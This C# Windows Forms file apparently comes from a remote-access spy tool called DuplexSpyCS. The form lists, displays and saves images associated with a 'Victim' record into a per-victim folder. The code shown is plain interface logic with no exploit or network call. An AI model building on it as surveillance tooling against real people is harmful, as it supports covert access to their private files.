using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace DuplexSpyCS
{
    public partial class frmFileShowImg : Form
    {
        public Victim v;
        private ImageList il;

        public frmFileShowImg()
        {
            InitializeComponent();
        }

        public void ShowImage(string filename, Image img)
        {
            ListViewItem item = new ListViewItem(Path.GetFileName(filename));
            item.Tag = new object[] 
            {
                filename, //FULL PATH
                img, //IMAGE
            };
            item.ImageKey = filename;
            il.Images.Add(filename, img);
            Invoke(new Action(() =>
            {
                listView1.Items.Add(item);
                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
                toolStripStatusLabel1.ForeColor = Color.Black;
            }));
        }

        void DisplayImg(ListViewItem item)
        {
            try
            {
                bool exist = false;
                foreach (TabPage p in tabControl1.TabPages)
                {
                    if (p.Text == item.Text)
                    {
                        exist = true;
                        tabControl1.SelectedTab = p;
                        break;
                    }
                }

                if (exist)
                    return;

                object[] objs = (object[])item.Tag;

                TabPage page = new TabPage();
                page.Text = item.Text;
                PictureBox pb = new PictureBox();
                pb.Image = (Image)objs[1];
                pb.SizeMode = PictureBoxSizeMode.Zoom;
                tabControl1.TabPages.Add(page);
                page.Controls.Add(pb);
                pb.Dock = DockStyle.Fill;
                tabControl1.SelectedTab = page;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void setup()
        {
            Text = @$"Display Image@Manager\\{v.ID}";

            il = new ImageList();
            il.ImageSize = new Size(250, 250);
            listView1.LargeImageList = il;
        }

        private void frmFileShowImg_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
                return;

            ListViewItem item = listView1.SelectedItems[0];
            DisplayImg(item);
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            string dir = Path.Combine(v.dir_victim, "Images");
            if (!Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            try
            {
                frmShowImgSave f = new frmShowImgSave();
                f.Text = $@"SaveImage@ShowImage\\{v.ID}";
                f.img_cnt = listView1.Items.Count;
                f.Show();

                foreach (ListViewItem item in listView1.Items)
                {
                    object[] objs = (object[])item.Tag;
                    Image img = (Image)objs[1];
                    string path = Path.Combine(dir, item.Text);
                    bool path_exist = File.Exists(path);
                    try
                    {
                        img.Save(path);
                        f.UpdateProgress($"[{DateTime.Now.ToString("F")}] {path} => OK");
                    }
                    catch (Exception ex)
                    {
                        f.UpdateProgress($"[{DateTime.Now.ToString("F")}] {path} => ERROR[{ex.Message}]");
                    }
                }

                MessageBox.Show("Save images successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                toolStripStatusLabel1.Text = "Open Folder(Click me!)";
                toolStripStatusLabel1.ForeColor = Color.Blue;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {
            if (toolStripStatusLabel1.ForeColor == Color.Blue)
            {
                string dir = Path.Combine(v.dir_victim, "Images");
                try
                {
                    ProcessStartInfo info = new ProcessStartInfo()
                    {
                        FileName = "explorer.exe",
                        Arguments = dir,
                    };
                    Process.Start(info);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                DisplayImg(item);
            }
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    if (tabControl1.SelectedIndex == 0)
                    {
                        foreach (ListViewItem item in listView1.Items)
                            item.Selected = true;
                    }
                }
                else if (e.KeyCode == Keys.W)
                {
                    if (tabControl1.SelectedIndex > 0)
                    {
                        tabControl1.TabPages.Remove(tabControl1.SelectedTab);
                    }
                }
            }
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
                return;

            for (int i = 1; i < tabControl1.TabPages.Count; i++)
            {
                tabControl1.TabPages.Remove(tabControl1.TabPages[i]);
            }
        }
    }
}
